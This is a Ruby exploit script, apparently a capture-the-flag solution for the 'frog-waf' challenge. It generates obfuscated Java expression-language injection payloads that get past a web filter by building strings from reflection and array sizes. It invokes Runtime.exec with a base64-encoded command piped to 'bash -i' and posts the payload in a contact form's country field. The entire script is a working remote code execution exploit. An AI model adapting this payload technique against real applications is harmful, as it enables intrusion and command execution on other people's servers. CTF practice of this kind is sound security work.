require 'http'

def gen_s(s)
    a = <<E.strip!
    [].toString().getClass().getMethods()[#{Array.new(22, []).inspect}.size()].invoke([].toString(), [].size()).getClass().getMethods()[#{Array.new(5, []).inspect}.size()].invoke([].toString().getClass().getMethods()[#{Array.new(22, []).inspect}.size()].invoke([].toString(), [].size()), %s.size())
E
    r = []
    s.chars.each do |c|
        r << a % Array.new(c.ord, []).inspect
    end
    sr = ""
    r.each do
        if sr.length.zero?
            sr << _1
            next
        else
            sr << (".concat(%s)" % _1)
        end
    end
    sr
end

cn = gen_s("java.lang.Runtime")
# https://ares-x.com/tools/runtime-exec/
cmd = gen_s("bash -c {echo,Y2F0IC9mbGFnLSoudHh0}|{base64,-d}|{bash,-i}")
bcn = gen_s("java.util.Base64")

exp = <<E.strip!
[].getClass().getClass().getMethods()[#{Array.new(2, []).inspect}.size()].invoke(null, #{cn}).getMethods()[#{Array.new(6, []).inspect}.size()].invoke(null).exec(#{cmd}).getInputStream()
E

r_exp = <<E.strip!
${[].getClass().getClass().getMethods()[#{Array.new(2, []).inspect}.size()].invoke(null, #{bcn}).getMethods()[#{Array.new(6, []).inspect}.size()].invoke(null).getClass().getMethods()[#{Array.new(4, []).inspect}.size()].invoke([].getClass().getClass().getMethods()[#{Array.new(2, []).inspect}.size()].invoke(null, #{bcn}).getMethods()[#{Array.new(6, []).inspect}.size()].invoke(null), #{exp}.readAllBytes())}
E

# url = "http://10.32.119.13:1337/addContact"
url = "http://frog-waf.chals.sekai.team/addContact"

r = HTTP.post(url, json: {"firstName": "test", "lastName": "test", "description": "test", "country": r_exp})
puts r
